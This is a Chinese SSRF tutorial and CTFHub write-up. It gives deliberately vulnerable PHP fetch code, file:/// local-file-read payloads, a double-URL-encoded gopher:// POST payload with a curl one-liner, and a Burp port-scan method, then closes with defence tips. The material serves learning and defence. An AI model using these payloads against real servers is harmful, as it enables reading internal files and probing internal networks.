@@ -1,0 +1,391 @@
+**学习总结SSRF漏洞，能力有限，如有错误请大佬指正**
+
+很多web应用都提供了从其他的服务器上获取数据的功能。使用用户指定的URL，web应用可以获取图片，下载文件，读取文件内容
+
+如果没有对指定URL做过滤措施，就有可能存在SSRF漏洞
+
+SSRF思维导图如下，本篇主要介绍漏洞产生与gopher、file协议的利用方式
+
+![image-20201120094117105](https://image.3001.net/images/20211019/1634638107_616e991ba27e6283d6a09.png!small)
+
+## SSRF定义
+
+服务端请求伪造（Server Side Request Forgery, SSRF）指的是攻击者在未能取得服务器所有权限时，
+**利用服务器漏洞以“服务器的身份”发送构造好的请求给服务器所在内网的一个安全漏洞**
+
+一般情况下， **SSRF攻击通常针对外部网络无法直接访问的内部系统**
+
+ **SSRF 形成的原因：**
+
+1.服务端提供了从其他服务器应用获取数据的功能
+
+2.没有对目标地址做过滤与限制
+
+比如从指定URL地址获取网页文本内容，加载指定地址的图片，下载文件等等
+
+## 漏洞产生与危害
+
+在PHP中的curl()，file_get_contents()，fsockopen()等函数是几个主要产生ssrf漏洞的函数
+
+ **file_get_contents()**
+
+    
+    
+    //file_get_contents是把文件写入字符串，当把url是内网文件的时候，会先去把这个文件的内容读出来再写入，导致了文件读取
+    
+    <?php
+    if(isset($_POST['url']))
+    {
+        $content=file_get_contents($_POST['url']);
+        $filename='./images/'.rand().'.img';\
+        file_put_contents($filename,$content);
+        echo $_POST['url'];
+        $img="<img src=\"".$filename."\"/>";
+    
+    }
+    echo $img;
+    ?>
+    
+
+**fsockopen()**
+
+    
+    
+    //fsockopen()函数本身就是打开一个网络连接或者Unix套接字连接
+    
+    <?php
+    $host=$_GET['url'];
+    $fp = fsockopen("$host", 80, $errno, $errstr, 30);
+    if (!$fp) {
+        echo "$errstr ($errno)<br />\n";
+    } else {
+        $out = "GET / HTTP/1.1\r\n";
+        $out .= "Host: $host\r\n";
+        $out .= "Connection: Close\r\n\r\n";
+        fwrite($fp, $out);
+        while (!feof($fp)) {
+            echo fgets($fp, 128);
+        }
+        fclose($fp);
+    }
+    ?>
+    
+
+**curl()**
+
+    
+    
+    //利用方式很多最常见的是通过file、dict、gopher这三个协议来进行渗透，接下来也主要是集中讲对于curl()函数的利用方式
+    
+    function curl($url){  
+        $ch = curl_init(); //  初始化curl连接句柄
+        curl_setopt($ch, CURLOPT_URL, $url); //设置连接URL
+        curl_setopt($ch, CURLOPT_HEADER, 0);  // 不输出头文件的信息
+        curl_exec($ch);   // 执行获取结果
+        curl_close($ch);  // 关闭curl连接句柄
+    }
+    
+    $url = $_GET['url'];
+    curl($url); 
+    
+
+SSRF可以对外网、服务器所在内网、本地进行端口扫描，攻击运行在内网或本地的应用，或者利用File协议读取本地文件
+
+内网服务防御相对外网服务来说一般会较弱，甚至部分内网服务为了运维方便并没有对内网的访问设置权限验证，所以存在SSRF时，通常会造成较大的危害
+
+## 说在前面
+
+URL的结构格式如下：
+
+    
+    
+    scheme://user:pass@host:port/path?query=value#fragment
+    
+    // 其中scheme 可以是gopher dict file ftp ftps http https imap imaps pop3 pop3s smtp smtps telnet tftp
+    
+
+当我们发现SSRF漏洞后，首先要做的事情就是测试所有可用的URL伪协议
+
+ **常用URL伪协议**
+
+    
+    
+    file:///  -- 本地文件传输协议，主要用于访问本地计算机中的文件
+    dict://   -- 字典服务器协议，dict是基于查询相应的TCP协议，服务器监听端口2628
+    sftp://   -- SSH文件传输协议（SSH File Transfer Protocol），或安全文件传输协议（Secure File Transfer Protocol）
+    ldap://   -- 轻量级目录访问协议。它是IP网络上的一种用于管理和访问分布式目录信息服务的应用程序协议
+    tftp://   -- 基于lockstep机制的文件传输协议，允许客户端从远程主机获取文件或将文件上传至远程主机
+    gopher:// -- 互联网上使用的分布型的文件搜集获取网络协议，出现在http协议之前
+    
+
+**curl命令**
+
+    
+    
+    root@kali:~# curl -V
+    curl 7.67.0 (x86_64-pc-linux-gnu) libcurl/7.67.0 OpenSSL/1.1.1d zlib/1.2.11 brotli/1.0.7 libidn2/2.2.0 libpsl/0.20.2 (+libidn2/2.0.5) libssh2/1.8.0 nghttp2/1.40.0 librtmp/2.3
+    Release-Date: 2019-11-06
+    Protocols: dict file ftp ftps gopher http https imap imaps ldap ldaps pop3 pop3s rtmp rtsp scp sftp smb smbs smtp smtps telnet tftp 
+    Features: AsynchDNS brotli GSS-API HTTP2 HTTPS-proxy IDN IPv6 Kerberos Largefile libz NTLM NTLM_WB PSL SPNEGO SSL TLS-SRP UnixSockets
+    
+
+可以看到该版本的curl支持很多协议，其中 **gopher协议、dict协议、file协议、http/s协议** 在进行SSRF漏洞利用时用的比较多
+
+## SSRF常见攻击场景
+
+结合CTFHub平台技能树中的SSRF四个题目进行实践操作，找到flag即为解题成功
+
+![image-20201117171413264](https://image.3001.net/images/20211019/1634638108_616e991c80b3858fb5e8d.png!small)
+
+### 场景一：读取本地文件
+
+#### 无限制直接读取本地文件
+
+题目一：【内网访问】
+
+打开题目，访问题目URL，打开chrome的network面板，可以看到网页重定向到`/?url`
+
+![image-20201118164048606](https://image.3001.net/images/20211019/1634638109_616e991d8a4cec32948a4.png!small)
+
+此时，url参数意味着可以指定地址访问请求，这里需要拿到flag，直接尝试访问web目录下的flag.php，构造url参数值如下：
+
+    
+    
+    url=http://127.0.0.1/flag.php
+    
+
+因为没对目标地址做任何过滤与限制，即可拿到flag
+
+![image-20201118163955950](https://image.3001.net/images/20211019/1634638110_616e991e85c33c09649b9.png!small)
+
+#### 伪协议读取本地文件
+
+题目二：【伪协议读取文件】
+
+ **知识点：URL伪协议之file协议**
+
+    
+    
+    file:///   -- 本地文件传输协议，主要用于访问本地计算机中的文件
+    
+
+如题目一一样，使用burpsuite抓包工具抓取重定向的请求包，发送到Repeater重放攻击模块，同样将url参数赋值为`http://127.0.0.1/flag.php`尝试获取flag
+
+![image-20201118162610824](https://image.3001.net/images/20211019/1634638111_616e991f72bffc8f08117.png!small)
+
+发现http协议访问并没有有意义的回显，使用file协议进行尝试，通常web目录为`/var/www/html`，构造url参数值如下
+
+    
+    
+    url=file:///var/www/html/flag.php
+    
+
+得到flag
+
+![image-20201118162847795](https://image.3001.net/images/20211019/1634638112_616e99208f85753898833.png!small)
+
+#### 限制仅本机可读取本地文件
+
+题目三：【POST请求】
+
+ **知识点：URL伪协议之gopher协议**
+
+ **gopher协议是ssrf利用中最强大的协议**
+
+    
+    
+    // gopher协议
+    在WWW出现之前，Gopher是Internet上最主要的信息检索工具，Gopher站点也是最主要的站点，使用tcp70端口。但在WWW出现后，Gopher失去了昔日的辉煌
+    
+    // gopher协议特点：
+    gopher协议支持发出GET、POST请求：可以先截获get请求包和post请求包，在构成符合gopher协议的请求（换行使用%0d%0a，空白行%0a）
+    
+    // gopher协议的格式：
+    gopher://<host>:<port>/<gopher-path>_后接TCP数据流 
+    
+    // gopher协议在curl命令中的使用方式：
+    curl gopher://localhost:2222/hello%0agopher
+    
+
+gopher协议在各个编程语言中的使用限制
+
+协议| 支持情况  
+---|---  
+PHP| \--wite-curlwrappers 且 php版本至少为5.3  
+Java| 小于JDK1.7  
+Curl| 低版本不支持  
+Perl| 支持  
+ASP.NET| 小于版本3  
+  
+开启题目环境，发现了`flag.php，index.php`两个文件
+
+![image-20201119150828976](https://image.3001.net/images/20211019/1634638113_616e9921a1aa242084d24.png!small)
+
+首先尝试使用http协议直接访问`flag.php`，结果如下
+
+![image-20201119150555621](https://image.3001.net/images/20211019/1634638114_616e9922b1bfab1e7087f.png!small)
+
+提示需要使用POST请求`/flag.php`文件，且需要加上参数key，key在注释中已给出
+
+顺着提示，在burp中构造POST请求包，响应包返回只能`127.0.0.1`可以请求`flag.php`
+
+![image-20201119151043191](https://image.3001.net/images/20211019/1634638115_616e9923c20eb7a840d02.png!small)
+
+尝试用file协议读取`flag.php，index.php`文件源码
+
+    
+    
+    http://xxxx.ctfhub.com:10080/?url=file:///var/www/html/index.php
+    http://xxxx.ctfhub.com:10080/?url=file:///var/www/html/flag.php
+    
+
+![image-20201119152849125](https://image.3001.net/images/20211019/1634638116_616e9924d900f6153d4b8.png!small)
+
+源码如下：
+
+    
+    
+    // flag.php
+    <?php
+    
+    error_reporting(0);
+    
+    if ($_SERVER["REMOTE_ADDR"] ! = "127.0.0.1") {
+        echo "Just View From 127.0.0.1";
+        return;
+    }
+    
+    $flag=getenv("CTFHUB");
+    $key = md5($flag);
+    
+    if (isset($_POST["key"]) && $_POST["key"] == $key) {
+        echo $flag;
+        exit;
+    }
+    ?>
+    
+    <form action="/flag.php" method="post">
+    <input type="text" name="key">
+    <!-- Debug: key=<?php echo $key;?>-->
+    </form>
+    
+    
+    
+    
+    // index.php
+    <?php
+    
+    error_reporting(0);
+    
+    if (!isset($_REQUEST['url'])){
+        header("Location: /?url=_");
+        exit;
+    }
+    
+    $ch = curl_init();   //  初始化curl连接句柄
+    curl_setopt($ch, CURLOPT_URL, $_REQUEST['url']);  //设置连接URL
+    curl_setopt($ch, CURLOPT_HEADER, 0);  // 不输出头文件的信息
+    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);  //根据服务器返回 HTTP 头中的 "Location: " 重定向
+    curl_exec($ch);  // 执行获取结果
+    curl_close($ch); // 关闭curl连接句柄
+    
+
+通过阅读`flag.php`源码，我们需要想办法使`REMOTE_ADDR`的值为`127.0.0.1`，也就是说只能从`127.0.0.1`进行请求才能拿到flag，由此需要
+**利用gopher协议来构造出一个从`127.0.0.1`发出的POST请求包**即可
+
+构造POST请求如下：
+
+    
+    
+    POST /flag.php HTTP/1.1
+    Host: 127.0.0.1:80
+    Content-Length: 36	                 // 特别注意此处的长度，长度不对也是不行的
+    Content-Type: application/x-www-form-urlencoded
+    
+    key=57b046d9c65b63b05eceb6eca3c5d177  // key需要去通过127.0.0.1访问flag.php获取，也就是flag的MD5值
+    
+
+需注意，通过gopher协议进行请求时，要将http包进行URL编码
+
+> 1、问号（?）需要转码为URL编码，也就是%3f
+>
+> 2、回车换行要变为%0d%0a
+>
+> 3、在HTTP包的最后要加%0d%0a，代表消息结束
+
+由于 **PHP默认解码`$ _GET`和`$
+_REQUEST`数据**，必须要对http包进行二次URL编码，否则index.php执行时发起gopher请求时，会因为被PHP解码后的数据存在空格导致数据截断原因出错
+
+综上，构造url参数值如下
+
+    
+    
+    url=gopher://127.0.0.1:80/_POST%2520%2fflag.php%2520HTTP%2f1.1%250d%250aHost%3a%2520127.0.0.1%3a80%250d%250aContent-Length%3a%252036%250d%250aContent-Type%3a%2520application%2fx-www-form-urlencoded%250d%250a%250d%250akey%3d57b046d9c65b63b05eceb6eca3c5d177%250d%250a
+    
+
+完整POST请求包如下，即可得到flag
+
+![image-20201119152533156](https://image.3001.net/images/20211019/1634638117_616e9925f00aaabfb301f.png!small)
+
+也可以使用curl命令, payload如下
+
+    
+    
+    curl -vvv "http://challenge-cebf15f16c12aabf.sandbox.ctfhub.com:10080/?url=gopher://127.0.0.1:80/_POST%2520%2fflag.php%2520HTTP%2f1.1%250d%250aHost%3a%2520127.0.0.1%3a80%250d%250aContent-Length%3a%252036%250d%250aContent-Type%3a%2520application%2fx-www-form-urlencoded%250d%250a%250d%250akey%3d57b046d9c65b63b05eceb6eca3c5d177%250d%250a"
+    
+
+* * *
+
+flag如下
+
+![image-20201119153741402](https://image.3001.net/images/20211019/1634638119_616e99277cd6522c87b28.png!small)
+
+### 场景二：端口扫描
+
+题目四：【端口扫描】
+
+如题目一样302重定向，然后重定向的响应包的发现提示信息~
+
+![image-20201118165320820](https://image.3001.net/images/20211019/1634638120_616e99289699101ec7593.png!small)
+
+可以推测，在8000-9000中的某个端口，至少有东西或者flag存在
+
+于是可以构造url参数值如下：
+
+    
+    
+    url=http://127.0.0.1:8000
+    
+
+将包发到burp
+Intruder爆破模块，选择需要递增的端口号作为payload![image-20201118165914348](https://image.3001.net/images/20211019/1634638121_616e9929bddb47985de24.png!small)
+
+设置好参数后开始爆破，结果如下，在8089端口得到flag![image-20201118170101821](https://image.3001.net/images/20211019/1634638122_616e992accb9bc6c9277d.png!small)
+
+同样的，真实业务环境下，可以对本机的开放端口进行探测。
+
+可以得出结论， **SSRF可以对外网、服务器所在内网、本地进行端口扫描**
+
+## 防御
+
+通常有以下5个思路：
+
+1.过滤返回信息。如果web应用是去获取某一种类型的文件。那么在把返回结果展示给用户之前先验证返回的信息是否符合标准
+
+2.统一错误信息。避免用户可以根据错误信息来判断远端服务器的端口状态
+
+3.限制请求的端口为http常用的端口。比如，80,443,8080,8090。
+
+4.内网IP设置黑名单。避免应用被用来获取获取内网数据，攻击内网。
+
+5.禁用不需要的协议，仅仅允许http和https请求。可以防止类似file:///,gopher://,ftp:// 等引起的问题。
+
+## 参考
+
+[Web安全基础学习之SSRF漏洞利用](https://ca0y1h.top/Web_security/basic_learning/17.SSRF%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/
+"Web安全基础学习之SSRF漏洞利用")
+
+[SSRF中URL的伪协议](https://www.cnblogs.com/-mo-/p/11673190.html "SSRF中URL的伪协议")
+
+[gopher 协议在SSRF 中的一些利用](https://xz.aliyun.com/t/6993 "gopher 协议在SSRF 中的一些利用")
+
